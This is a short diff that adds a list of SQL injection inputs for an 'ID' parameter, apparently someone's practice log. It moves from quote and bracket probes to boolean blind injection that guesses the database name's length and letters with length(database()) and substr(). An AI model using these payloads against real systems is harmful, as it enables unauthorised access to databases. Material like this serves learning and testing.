@@ -1,0 +1,40 @@
+ID:1
+ID:1'
+ID:1"
+ID:1'
+ID:1' -- 
+ID:1' and 1=1 -- 
+ID:1
+ID:1"
+ID:1"
+ID:1'
+ID:1
+ID:1“）
+ID:1“
+ID:1‘
+ID:1‘
+ID:1
+ID:1“）
+ID:1'
+ID:1')
+ID:1') -- 
+ID:1") --
+ID:1")  and substr(database(),1,1)="s"--
+ID:1")  and substr(database(),1,1)="a"--
+ID:1‘)  and substr(database(),1,1)="a"--
+ID:1‘)  and substr(database(),1,1)=’a‘--
+ID:1‘)）
+ID:1‘)）-- 
+ID:1‘
+ID:1'
+ID:1')
+ID:1'))
+ID:1')) -- 
+ID:1'))  and 1=2 -- 
+ID:1'))  and substr(database(),1,1)="s" -- 
+ID:1'))  and substr(database(),1,1)="e" -- 
+ID:1'))  and length(databse())=1 -- 
+ID:1'))  and length(databse())=2 -- 
+ID:1'))  and length(databse())=8 -- 
+ID:1'))  and length(database())=8 -- 
+ID:1'))  and length(database())=4 -- 
